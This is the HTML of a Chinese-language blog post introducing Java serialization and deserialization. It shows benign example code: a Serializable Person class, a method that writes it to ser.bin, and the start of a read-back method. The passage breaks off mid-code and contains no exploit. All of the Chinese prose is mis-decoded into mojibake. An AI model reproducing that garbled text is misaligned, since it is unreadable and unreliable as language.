

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">

  <!-- ä¸­æ–‡å­—ä½“ï¼šéœé¹œæ–‡æ¥· Screen -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lxgw-wenkai-screen-webfont/style.css">
   
  <!-- è‹±æ–‡å­—ä½“ï¼šInter -->
  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap">

  <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@600&display=swap" rel="stylesheet">



  <!-- è‹±æ–‡å­—ä½“ Roboto Mono
  <!-- <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;600&display=swap" rel="stylesheet"> -->

  <!-- ä¸­æ–‡å­—ä½“ éœé¹œæ–‡æ¥· -->
  <!-- <link href="https://cdn.jsdelivr.net/npm/lxgw-wenkai-webfont@1.7.0/style.css" rel="stylesheet"> --> -->

  <link rel="apple-touch-icon" sizes="76x76" href="/img/0-11-%E6%AC%A7%E6%B6%A6%E5%90%89.png">
  <link rel="icon" href="/img/0-11-%E6%AC%A7%E6%B6%A6%E5%90%89.png">
  

  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
  
  <meta name="theme-color" content="linear-gradient(270deg, rgba(107,115,255,0.85), rgba(65,80,220,0.85), rgba(0,180,240,0.85), rgba(60,200,255,0.85), rgba(120,220,255,0.85), rgba(180,120,255,0.85), rgba(220,100,255,0.85), rgba(255,110,230,0.85), rgba(140,100,255,0.85), rgba(100,150,255,0.85), rgba(70,200,220,0.85), rgba(107,115,255,0.85))">
  <meta name="author" content="Xvsf">
  <meta name="keywords" content="">
  
    <meta name="description" content="Java ååºåˆ—åŒ–å­¦ä¹ ">
<meta property="og:type" content="article">
<meta property="og:title" content="Java ååºåˆ—åŒ–å­¦ä¹ ">
<meta property="og:url" content="http://xvshifu.github.io/2025/08/26/Java%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
<meta property="og:site_name" content="Xvsf blogs">
<meta property="og:description" content="Java ååºåˆ—åŒ–å­¦ä¹ ">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311749235.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311749774.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311750280.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311750920.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311751914.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311752489.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311752099.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311752120.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311752777.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311752211.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311752309.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311753866.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311753415.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311753682.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311753359.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311754403.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311754008.webp">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311755212.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311755559.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311755415.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311755653.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311755421.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311756610.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311756014.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311756302.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311756901.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311757978.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311757810.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311757644.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311757637.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311757323.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311757858.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311757062.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311758397.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311758656.png">
<meta property="article:published_time" content="2025-08-26T07:00:00.000Z">
<meta property="article:modified_time" content="2025-08-31T10:21:30.587Z">
<meta property="article:author" content="Xvsf">
<meta property="article:tag" content="java å­¦ä¹ ">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311749235.png">
  
  
    <meta name="referrer" content="no-referrer-when-downgrade">
  
  
  <title>Java ååºåˆ—åŒ–å­¦ä¹  - Xvsf blogs</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- ä¸»é¢˜ä¾èµ–çš„å›¾æ ‡åº“ï¼Œä¸è¦è‡ªè¡Œä¿®æ”¹ -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">



<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  



  
<link rel="stylesheet" href="/xm_custom/custom.css">
<link rel="stylesheet" href="/css/selection.css">
<link rel="stylesheet" href="/css/scrollAnimation.css">
<link rel="stylesheet" href="/css/border.css">
<link rel="stylesheet" href="/css/custom.css">
<link rel="stylesheet" href="/css/Background.css">
<link rel="stylesheet" href="/css/cloudedGlass.css">



  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"xvshifu.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":false,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":false},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"0wmNTqqCOUst92FKToSXxgvQ-gzGzoHsz","app_key":"p527aBaA4G01EJdMOVMGXsHR","server_url":"https://0wmntqqc.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":true},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  

  

  

  

  

  
    
  



  
<meta name="generator" content="Hexo 8.0.0"></head>





<body><!-- hexo injector body_begin start --><div id="web_bg"></div><!-- hexo injector body_begin end -->
  

  <header>
    

<div class="header-inner" style="height: 70vh; position: relative; overflow: hidden;">
  <!-- èƒŒæ™¯è§†é¢‘ -->
  <video autoplay muted loop id="bg-video">
    <source src="/videos/bg.mp4" type="video/mp4">
    Your browser does not support the video tag.
  </video>

  <!-- å¯¼èˆªæ å’Œ banner å†…å®¹ -->
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>ğŸ–‹ï¸ Hello My Blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>é¦–é¡µ</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>å½’æ¡£</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>åˆ†ç±»</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>æ ‡ç­¾</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>å…³äº</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/game/" target="_self">
                <i class="iconfont icon-steam"></i>
                <span>game</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/banner02.jpg') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="Java ååºåˆ—åŒ–å­¦ä¹ "></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2025-08-26 15:00" pubdate>
          2025å¹´8æœˆ26æ—¥ ä¸‹åˆ
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          6.3k å­—
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          53 åˆ†é’Ÿ
        
      </span>
    

    
    
      
        <span id="busuanzi_container_page_pv" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="busuanzi_value_page_pv"></span> æ¬¡
        </span>
        

      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">Java ååºåˆ—åŒ–å­¦ä¹ </h1>
            
              <p id="updated-time" class="note note-info" style="">
                
                  
                    æœ¬æ–‡æœ€åæ›´æ–°äº 2025å¹´8æœˆ31æ—¥ æ™šä¸Š
                  
                
              </p>
            
            
              <div class="markdown-body">
                
                <h1 id="Java-ååºåˆ—åŒ–"><a href="#Java-ååºåˆ—åŒ–" class="headerlink" title="Java ååºåˆ—åŒ–"></a>Java ååºåˆ—åŒ–</h1><h1 id="1ã€åºåˆ—åŒ–ä¸ååºåˆ—åŒ–"><a href="#1ã€åºåˆ—åŒ–ä¸ååºåˆ—åŒ–" class="headerlink" title="1ã€åºåˆ—åŒ–ä¸ååºåˆ—åŒ–"></a>1ã€åºåˆ—åŒ–ä¸ååºåˆ—åŒ–</h1><h2 id="1-1-ä»€ä¹ˆæ˜¯åºåˆ—åŒ–-ååºåˆ—åŒ–"><a href="#1-1-ä»€ä¹ˆæ˜¯åºåˆ—åŒ–-ååºåˆ—åŒ–" class="headerlink" title="1.1 ä»€ä¹ˆæ˜¯åºåˆ—åŒ–&amp;ååºåˆ—åŒ–"></a>1.1 ä»€ä¹ˆæ˜¯åºåˆ—åŒ–&amp;ååºåˆ—åŒ–</h2><p>åºåˆ—åŒ–ï¼šå°†å†…å­˜ä¸­çš„å¯¹è±¡å‹ç¼©æˆå­—èŠ‚æµ<br>ååºåˆ—åŒ–ï¼šå°†å­—èŠ‚æµè½¬åŒ–æˆå†…å­˜ä¸­çš„å¯¹è±¡</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311749235.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="1-2-ä¸ºä»€ä¹ˆæœ‰åºåˆ—åŒ–æŠ€æœ¯"><a href="#1-2-ä¸ºä»€ä¹ˆæœ‰åºåˆ—åŒ–æŠ€æœ¯" class="headerlink" title="1.2 ä¸ºä»€ä¹ˆæœ‰åºåˆ—åŒ–æŠ€æœ¯"></a>1.2 ä¸ºä»€ä¹ˆæœ‰åºåˆ—åŒ–æŠ€æœ¯</h2><p>åºåˆ—åŒ–ä¸ååºåˆ—åŒ–çš„è®¾è®¡å°±æ˜¯ç”¨æ¥ä¼ è¾“æ•°æ®çš„ã€‚</p>
<p><strong>åº”ç”¨åœºæ™¯</strong><br>(1) æƒ³æŠŠå†…å­˜ä¸­çš„å¯¹è±¡ä¿å­˜åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­æˆ–è€…æ˜¯æ•°æ®åº“å½“ä¸­ã€‚<br>(2) ç”¨å¥—æ¥å­—åœ¨ç½‘ç»œä¸Šä¼ è¾“å¯¹è±¡ã€‚<br>(3) é€šè¿‡RMIä¼ è¾“å¯¹è±¡çš„æ—¶å€™ã€‚</p>
<h2 id="1-3-å‡ ç§å¸¸è§çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–åè®®"><a href="#1-3-å‡ ç§å¸¸è§çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–åè®®" class="headerlink" title="1.3 å‡ ç§å¸¸è§çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–åè®®"></a>1.3 å‡ ç§å¸¸è§çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–åè®®</h2><ul>
<li>XML</li>
<li>SOAPï¼ˆSimple Object Access protocolï¼‰ æ˜¯ä¸€ç§è¢«å¹¿æ³›åº”ç”¨çš„ï¼ŒåŸºäº XML ä¸ºåºåˆ—åŒ–å’Œååºåˆ—åŒ–åè®®çš„ç»“æ„åŒ–æ¶ˆæ¯ä¼ é€’åè®®</li>
<li>JSONï¼ˆJavascript Object Notationï¼‰</li>
<li>Protobuf</li>
</ul>
<h2 id="1-4-åºåˆ—åŒ–å’Œååºåˆ—åŒ–å®ç°"><a href="#1-4-åºåˆ—åŒ–å’Œååºåˆ—åŒ–å®ç°" class="headerlink" title="1.4 åºåˆ—åŒ–å’Œååºåˆ—åŒ–å®ç°"></a>1.4 åºåˆ—åŒ–å’Œååºåˆ—åŒ–å®ç°</h2><p>ç®€å•åˆ†æ Java çš„å¯¹è±¡åºåˆ—åŒ–çš„ä¸åŒå†™æ³•ï¼š</p>
<p>ä¿©ç§å†™æ³•æœ¬è´¨ä¸Šéƒ½æ˜¯ Java çš„å¯¹è±¡åºåˆ—åŒ–ï¼Œä½†å®ƒä»¬åœ¨åº•å±‚çš„ IO æµä½¿ç”¨æ–¹å¼ä¸Šç•¥æœ‰ä¸åŒï¼š</p>
<p><strong>å†™æ³•ä¸€ï¼š</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));<br></code></pre></td></tr></table></figure>

<p>ä¼ ç»Ÿçš„åŸºäºå­—èŠ‚æµçš„æ–‡ä»¶å†™å…¥æ–¹å¼ï¼šFileOutputStream(â€œser.binâ€)ï¼Œ åˆ›å»ºä¸€ä¸ª <code>FileOutputStream</code>ï¼Œè¡¨ç¤ºè¦å†™å…¥çš„ç›®æ ‡æ–‡ä»¶æ˜¯ <code>ser.bin</code></p>
<p>ç‰¹ç‚¹ï¼š</p>
<ul>
<li>ç®€å•ç›´æ¥ï¼Œå…¼å®¹æ€§å¾ˆå¥½ï¼ŒJava æ—©æœŸç‰ˆæœ¬å°±æœ‰ã€‚</li>
<li>å¯¹è·¯å¾„å’Œæ–‡ä»¶åä½¿ç”¨çš„æ˜¯ <strong>å­—ç¬¦ä¸²å½¢å¼</strong>ã€‚</li>
</ul>
<p><strong>å†™æ³•äºŒï¼šï¼ˆIDEAæ¨èï¼‰</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">ObjectOutputStream oos = new ObjectOutputStream(Files.newOutputStream(Paths.get(&quot;ser.bin&quot;)));<br></code></pre></td></tr></table></figure>

<p><code>**Paths.get(&quot;ser.bin&quot;)**</code></p>
<ul>
<li>ä½¿ç”¨ <code>java.nio.file.Path</code> æ¥è¡¨ç¤ºæ–‡ä»¶è·¯å¾„ï¼Œæ¯” <code>String</code> æ›´çµæ´»ã€å¯ç»„åˆã€‚</li>
<li>å¯ä»¥æ–¹ä¾¿åœ°å¤„ç†è·¨å¹³å°è·¯å¾„ï¼Œæ¯”å¦‚ <code>&quot;folder/subfolder/file.txt&quot;</code></li>
</ul>
<p><code>**Files.newOutputStream(path)**</code></p>
<ul>
<li>è¿”å›ä¸€ä¸ª <code>OutputStream</code>ï¼ŒåŠŸèƒ½ç±»ä¼¼ <code>FileOutputStream</code>ã€‚</li>
<li>åŸºäº NIOï¼ˆNew IOï¼‰åº“ï¼Œæä¾›æ›´å¤šæ–‡ä»¶æ“ä½œé€‰é¡¹ï¼Œ</li>
</ul>
<p>ç‰¹ç‚¹ï¼š</p>
<ul>
<li>æ›´ç°ä»£åŒ–çš„å†™æ³•ï¼Œçµæ´»æ€§é«˜ï¼Œæ”¯æŒ NIO çš„å„ç§ç‰¹æ€§ã€‚</li>
<li>æ›´é€‚åˆä¸ <code>Path</code>ã€<code>Files</code> API é…åˆï¼Œæ¯”å¦‚æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å­˜åœ¨ã€åˆ›å»ºç›®å½•ç­‰ã€‚</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><span class="hljs-comment">//å®šä¹‰ä¸€ä¸ª Person ç±»ï¼Œå¹¶å£°æ˜å®ƒå®ç°äº† Serializable æ¥å£,è¿™æ · Person çš„å¯¹è±¡å°±å¯ä»¥è¢«åºåˆ—åŒ–</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br><br>    <span class="hljs-comment">//ç§æœ‰æˆå‘˜å˜é‡</span><br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-comment">//æ— å‚æ„é€ </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span> &#123;&#125;<br><br>    <span class="hljs-comment">//æœ‰å‚æ„é€ </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-comment">//é‡å†™ toString() æ–¹æ³•</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Person&#123;&quot;</span> +<br>        <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>        <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>        <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Serialization</span> &#123;<br><br>    <span class="hljs-comment">//å®šä¹‰ä¸€ä¸ªé™æ€æ–¹æ³• serialize(Object obj)ï¼Œæ¥æ”¶ä¸€ä¸ªå¯¹è±¡å¹¶æŠŠå®ƒåºåˆ—åŒ–åˆ°æ–‡ä»¶</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-comment">// ObjectOutputStreamï¼šåŒ…è£…æ–‡ä»¶è¾“å‡ºæµï¼Œä½¿å…¶æ”¯æŒå†™å¯¹è±¡</span><br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<br>            <span class="hljs-comment">// Files.newOutputStream(...)ï¼šåˆ›å»ºä¸€ä¸ªè¾“å‡ºæµï¼Œå†™å…¥åˆ° ser.bin æ–‡ä»¶</span><br>            <span class="hljs-comment">// Paths.get(&quot;ser.bin&quot;)ï¼šå¾—åˆ°ä¸€ä¸ªè·¯å¾„å¯¹è±¡ï¼Œè¡¨ç¤ºå½“å‰é¡¹ç›®ç›®å½•ä¸‹çš„ ser.bin æ–‡ä»¶</span><br>            Files.newOutputStream(Paths.get(<span class="hljs-string">&quot;ser.bin&quot;</span>))<br>        );<br>        <span class="hljs-comment">//oos.writeObject(obj)ï¼šæŠŠä¼ å…¥çš„ obj å†™åˆ°æ–‡ä»¶é‡Œï¼ˆå‰ææ˜¯å¯¹è±¡å¿…é¡»å®ç° Serializable æ¥å£ï¼‰</span><br>        oos.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;aa&quot;</span>, <span class="hljs-number">11</span>);<br>        System.out.println(person);<br>        <span class="hljs-comment">//æŠŠè¿™ä¸ª person å¯¹è±¡å†™å…¥ ser.bin æ–‡ä»¶</span><br>        serialize(person);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Unserialize</span> &#123;<br><br>    <span class="hljs-comment">//å®šä¹‰ä¸€ä¸ªé™æ€æ–¹æ³• unserializeï¼Œæ¥æ”¶åºåˆ—åŒ–åçš„äºŒè¿›åˆ¶æ–‡ä»¶</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-comment">//new ObjectInputStream(...)ï¼šåŒ…è£…æˆå¯¹è±¡è¾“å…¥æµï¼Œè¿™æ ·å¯ä»¥ç›´æ¥è¯»å–å¯¹è±¡</span><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<br>            <span class="hljs-comment">// Files.newInputStream(Paths.get(filename))ï¼šåˆ›å»ºä¸€ä¸ªè¾“å…¥æµï¼ŒæŒ‡å‘ filename æ–‡ä»¶</span><br>            Files.newInputStream(Paths.get(filename))<br>        );<br>        <span class="hljs-comment">//ois.readObject()ï¼šä»æ–‡ä»¶ä¸­è¯»å–å¯¹è±¡</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span 